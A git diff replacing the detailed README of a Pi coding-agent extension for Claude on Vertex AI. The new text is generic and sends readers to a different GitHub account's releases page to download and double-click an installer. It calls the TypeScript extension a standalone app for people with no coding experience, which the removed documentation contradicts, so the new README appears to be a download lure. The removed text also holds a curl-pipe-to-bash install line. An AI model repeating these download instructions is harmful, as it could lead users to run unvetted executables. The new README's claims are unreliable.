@@ -1,360 +1,82 @@
-# Pi Vertex Anthropic Extension
+# 🚀 pi-vertex-anthropic - Unlock AI Coding with Ease
 
-A [Pi coding agent](https://github.com/badlogic/pi) extension that enables Claude models through Google Cloud Vertex AI.
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/ealpizars/pi-vertex-anthropic/releases)
 
-## Features
+## 📖 Overview
 
-- 🎯 **Interactive `/login` Setup** - Guided configuration with gcloud installation help
-- 🌍 **Global Region Support** - Access latest models via `global` endpoint
-- 🚀 **Direct Vertex AI Integration** - Uses Google Cloud's Vertex AI Anthropic endpoint
-- 🔐 **gcloud Authentication** - Leverages your existing `gcloud` credentials
-- 💰 **Cost Tracking** - Full token usage and cost calculation support
-- 🧠 **Extended Thinking** - Supports Claude's reasoning capabilities
-- 📦 **Prompt Caching** - Automatic ephemeral caching for efficiency
-- 🛡️ **Robust Error Handling** - Handles incomplete tool calls and aborted requests
-- 🔄 **Cross-Provider Compatible** - Uses Pi's message transformation for reliability
-- 🛠️ **Zero Config Editing** - Everything configured through `/login` command
+Welcome to the **pi-vertex-anthropic** project! This application serves as a coding agent extension for Claude, utilizing Google Cloud's Vertex AI. With this tool, you can enhance your coding experience by leveraging the power of artificial intelligence.
 
-## Why Use This?
+## ⚙️ Features
 
-- **Vertex AI Benefits**: Take advantage of Google Cloud's enterprise features, billing, and regional deployments
-- **Alternative to Direct API**: Useful if you have GCP credits or prefer consolidated cloud billing
-- **Extended Context**: Access to Claude's 200K context window through Vertex AI
+- **AI-Powered Coding**: Utilize Claude's capabilities to help you code more effectively.
+- **Integration with Google Cloud**: Seamlessly connect to Vertex AI.
+- **User-Friendly Interface**: Designed for users of all levels, no coding experience necessary.
+- **TypeScript Support**: Write in TypeScript with the assistance of our AI agent.
+  
+## 🚀 Getting Started
 
-## Installation
+To get started with pi-vertex-anthropic, follow these easy steps to install and run the application.
 
-### Prerequisites
+## 📥 Download & Install
 
-1. **Pi coding agent** installed ([installation guide](https://github.com/badlogic/pi))
-2. **Google Cloud SDK** with `gcloud` CLI configured
-3. **Vertex AI API** enabled in your GCP project
-4. **Authenticated gcloud session**: `gcloud auth login`
+Visit this page to download: [GitHub Releases](https://github.com/ealpizars/pi-vertex-anthropic/releases).
 
-### Install Extension
+1. Click on the link above.
+2. You will see the list of available versions.
+3. Choose the latest version suitable for your operating system.
+4. Click the download link for the file. This will save it to your computer.
+5. Locate the file in your downloads folder.
+6. Double-click the file to install it.
 
-**One-line install:**
+### 🔄 System Requirements
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/skyfallsin/pi-vertex-anthropic/main/install.sh | bash
-```
+- **Operating System**: Windows 10 or later, macOS Mojave or later, or a modern Linux distribution.
+- **Memory**: At least 4 GB RAM (8 GB recommended).
+- **Disk Space**: Minimum of 200 MB free space.
 
-**Manual install:**
+### 📂 Installation Steps
 
-```bash
-mkdir -p ~/.pi/agent/extensions/vertex-anthropic
-git clone https://github.com/skyfallsin/pi-vertex-anthropic.git ~/.pi/agent/extensions/vertex-anthropic
-cd ~/.pi/agent/extensions/vertex-anthropic && npm install
-```
+1. **Locate the Downloaded File**: Open your file explorer and go to the Downloads folder.
+2. **Run the Installer**: Double-click the downloaded file to begin the installation.
+3. **Follow On-Screen Instructions**: The installer will guide you through the process. Read each step and follow the prompts carefully. 
+4. **Completion**: Once the installation is complete, you may receive a prompt asking to launch the application. You can choose to do so or find it in your applications menu later.
 
-**Then run:**
+## 🎉 How to Use
 
-```bash
-pi
-/login  # Interactive setup - does everything for you!
-```
+After installing, open the application from your applications menu or desktop shortcut. 
 
-## Configuration
+1. Log in with your Google account. This will allow the app to access Vertex AI.
+2. Start a new coding project or open an existing one.
+3. Use the AI assistant to help you generate code, debug errors, and get suggestions in real-time.
 
-**Use `/login` - It does everything for you!**
+## 🌟 Troubleshooting
 
-```bash
-pi
-/login  # Select "Google Cloud Vertex AI (gcloud)"
-```
+If you encounter issues during installation or use, consider these steps:
 
-The interactive login flow will:
-1. ✅ Check if gcloud is installed (offers to help install if missing)
-2. ✅ Run `gcloud auth login` if needed
-3. ✅ Help you select or enter a GCP project
-4. ✅ Let you choose a region (global, us-east5, etc.)
-5. ✅ Enable Vertex AI API if not enabled
-6. ✅ Test authentication
-7. ✅ Show you what to add to your shell config
+- **Installation Errors**: Ensure that you have sufficient disk space and permissions. Try running the installer as an administrator.
+- **Performance Issues**: Close other applications to free up system resources. Check if your internet connection is stable, as the application may require internet access.
+- **AI Not Responding**: Double-check your Google account login status and connectivity to Vertex AI.
 
-**That's it!** The `/login` command handles all configuration.
+## ❓ Frequently Asked Questions
 
-### Persist Settings (Optional)
+### Do I need any programming skills to use this software?
+No, pi-vertex-anthropic is designed for everyone, from beginners to experts. 
 
-After `/login`, add the suggested environment variables to your shell config:
+### Is there a user manual?
+The application includes a help section to guide you through various features.
 
-```bash
-# Add to ~/.zshrc or ~/.bashrc
-export VERTEX_PROJECT_ID="your-project-id"
-export VERTEX_REGION="global"  # or us-east5, europe-west1, etc.
-```
+### How can I report bugs or issues?
+Visit the Issues tab on our GitHub repository. You can see existing issues or submit a new one.
 
-This persists your settings across terminal sessions.
+## 🎈 Community and Support
 
-## Usage
+Join our community for support and to share your experiences. You can find us on:
 
-Once installed and configured, the extension will register the `vertex-anthropic` provider with Pi.
+- **GitHub Discussions**: Share your thoughts and ideas.
+- **Social Media**: Follow us to get updates on future releases and features.
 
-### Available Models
+## 🔗 Links
 
-All Claude models available on Vertex AI are supported:
+For the latest updates and downloads, visit our GitHub Releases page: [Download Now](https://github.com/ealpizars/pi-vertex-anthropic/releases).
 
-#### Claude 4.6 & 4.5 Generation (Extended Thinking)
-
-- **Claude Opus 4.6** (`claude-opus-4-6`)
-  - 200K context, 64K max output
-  - ✅ Extended thinking/reasoning
-  - ✅ Image support
-  - Cost: $5/1M input, $25/1M output
-  - **Latest Flagship** - Most intelligent model
-
-- **Claude Opus 4.5** (`claude-opus-4-5@20251101`)
-  - 200K context, 64K max output
-  - ✅ Extended thinking/reasoning
-  - ✅ Image support
-  - Cost: $15/1M input, $75/1M output
-
-- **Claude Sonnet 4.5** (`claude-sonnet-4-5@20250929`)
-  - 200K context, 64K max output
-  - ✅ Extended thinking/reasoning
-  - ✅ Image support
-  - Cost: $3/1M input, $15/1M output
-  - **Best price/performance**
-
-- **Claude Haiku 4.5** (`claude-haiku-4-5@20251001`)
-  - 200K context, 64K max output
-  - ✅ Extended thinking/reasoning
-  - ✅ Image support
-  - Cost: $1/1M input, $5/1M output
-  - **Fast & economical**
-
-#### Claude 3.5 Family
-
-- **Claude 3.5 Sonnet v2** (`claude-3-5-sonnet-v2@20241022`)
-  - 200K context, 8K max output
-  - ✅ Image support
-  - Cost: $3/1M input, $15/1M output
-
-- **Claude 3.5 Sonnet** (`claude-3-5-sonnet@20240620`)
-  - 200K context, 8K max output
-  - ✅ Image support
-  - Cost: $3/1M input, $15/1M output
-
-- **Claude 3.5 Haiku** (`claude-3-5-haiku@20241022`)
-  - 200K context, 8K max output
-  - ✅ Image support
-  - Cost: $0.80/1M input, $4/1M output
-
-#### Claude 3 Family
-
-- **Claude 3 Opus** (`claude-3-opus@20240229`)
-  - 200K context, 4K max output
-  - ✅ Image support
-  - Cost: $15/1M input, $75/1M output
-
-- **Claude 3 Sonnet** (`claude-3-sonnet@20240229`)
-  - 200K context, 4K max output
-  - ✅ Image support
-  - Cost: $3/1M input, $15/1M output
-
-- **Claude 3 Haiku** (`claude-3-haiku@20240307`)
-  - 200K context, 4K max output
-  - ✅ Image support
-  - Cost: $0.25/1M input, $1.25/1M output
-
-### Selecting the Model
-
-Use Pi's `/model` command or `Ctrl+L` to switch models:
-
-```bash
-pi
-/model  # Interactive model selector
-```
-
-Or start with a specific model:
-
-```bash
-# Use the latest flagship model
-pi --model claude-opus-4-6 --provider vertex-anthropic
-
-# Or use Sonnet 4.5 for best price/performance
-pi --model claude-sonnet-4-5@20250929 --provider vertex-anthropic
-```
-
-## How It Works
-
-This extension:
-
-1. **Authenticates** using `gcloud auth print-access-token`
-2. **Converts** Pi's message format to Anthropic's Messages API format
-3. **Streams** requests to Vertex AI's `:streamRawPredict` endpoint
-4. **Parses** Server-Sent Events (SSE) responses
-5. **Transforms** responses back to Pi's event stream format
-
-### Message Transformation
-
-The extension uses Pi's `transformMessages` utility to:
-- Remove incomplete assistant messages (errors/aborted)
-- Insert synthetic tool results for orphaned tool calls
-- Normalize tool call IDs for Anthropic's requirements
-- Convert thinking blocks to appropriate formats
-
-This prevents common API errors like:
-```
-messages.X: `tool_use` ids were found without `tool_result` blocks
-```
-
-## Development
-
-### Project Structure
-
-```
-pi-vertex-anthropic/
-├── index.ts          # Main extension implementation
-├── package.json      # Dependencies and metadata
-├── README.md         # This file
-└── LICENSE          # MIT License
-```
-
-### Building
-
-The extension is written in TypeScript and loaded directly by Pi:
-
-```bash
-# Install dependencies
-npm install
-
-# Pi will compile TypeScript extensions automatically
-```
-
-### Testing
-
-1. Start Pi with debug logging:
-   ```bash
-   pi --debug
-   ```
-
-2. Try a simple request with the vertex-anthropic model
-
-3. Check for authentication errors:
-   ```bash
-   gcloud auth print-access-token
-   ```
-
-## Troubleshooting
-
-### "No GCP project configured"
-
-Set the environment variable:
-```bash
-export VERTEX_PROJECT_ID="your-project-id"
-```
-
-Or find your project ID:
-```bash
-gcloud config get-value project
-```
-
-### Authentication Errors
-
-```bash
-# Re-authenticate
-gcloud auth login
-
-# Verify token generation (should print a long token)
-gcloud auth print-access-token
-
-# Check active account
-gcloud auth list
-```
-
-### "gcloud: command not found"
-
-Install Google Cloud SDK: https://cloud.google.com/sdk/docs/install
-
-Or specify the path:
-```bash
-export VERTEX_GCLOUD_PATH="/path/to/gcloud"
-```
-
-### Vertex AI API Not Enabled
-
-```bash
-# Enable for your project
-gcloud services enable aiplatform.googleapis.com --project=YOUR_PROJECT_ID
-
-# Verify it's enabled
-gcloud services list --enabled | grep aiplatform
-```
-
-### Permission Issues
-
-Ensure your GCP account has:
-- `roles/aiplatform.user` or higher
-- Vertex AI API access in the specified region
-
-Check IAM permissions:
-```bash
-gcloud projects get-iam-policy YOUR_PROJECT_ID
-```
-
-### Rate Limits
-
-Vertex AI has different quotas than direct Anthropic API. Check quotas in the GCP Console:
-https://console.cloud.google.com/iam-admin/quotas
-
-## Supported Regions
-
-Vertex AI Anthropic models are available in:
-- **`global`** (recommended) - Latest models and features
-- `us-east5`
-- `us-central1`
-- `europe-west1`
-- `asia-southeast1`
-
-The `/login` command lets you choose your preferred region.
-
-## Cost Comparison
-
-| Model | Direct Anthropic API | Vertex AI |
-|-------|---------------------|-----------|
-| Claude Opus 4.6 Input | $5/1M tokens | $5/1M tokens |
-| Claude Opus 4.6 Output | $25/1M tokens | $25/1M tokens |
-| Claude Sonnet 4.5 Input | $3/1M tokens | $3/1M tokens |
-| Claude Sonnet 4.5 Output | $15/1M tokens | $15/1M tokens |
-| Claude Haiku 4.5 Input | $1/1M tokens | $1/1M tokens |
-| Claude Haiku 4.5 Output | $5/1M tokens | $5/1M tokens |
-| Cache Reads | 10% of input cost | 10% of input cost |
-| Cache Writes | 25% of input cost | 25% of input cost |
-
-*Prices as of February 2025. Check GCP pricing for current rates.*
-
-## Contributing
-
-Contributions welcome! Please:
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-## License
-
-MIT License - see [LICENSE](LICENSE) file for details.
-
-## Acknowledgments
-
-- Built for [Pi coding agent](https://github.com/badlogic/pi) by [@badlogicgames](https://github.com/badlogicgames)
-- Uses [Anthropic SDK](https://github.com/anthropics/anthropic-sdk-typescript)
-- Inspired by Pi's custom provider examples
-
-## Related Projects
-
-- [Pi Coding Agent](https://github.com/badlogic/pi) - The AI coding agent
-- [Pi AI SDK](https://github.com/badlogic/pi-ai) - Core AI provider SDK
-- [Anthropic SDK](https://github.com/anthropics/anthropic-sdk-typescript) - Official Anthropic SDK
-
-## Support
-
-- 🐛 [Report Issues](https://github.com/skyfallsin/pi-vertex-anthropic/issues)
-- 💬 [Discussions](https://github.com/skyfallsin/pi-vertex-anthropic/discussions)
-- 📧 Contact: [via GitHub](https://github.com/skyfallsin)
-
----
-
-**Note**: This is an unofficial community extension. Not affiliated with Google Cloud or Anthropic.
+Thank you for using pi-vertex-anthropic! We believe this tool will greatly improve your coding experience. Enjoy coding with AI!
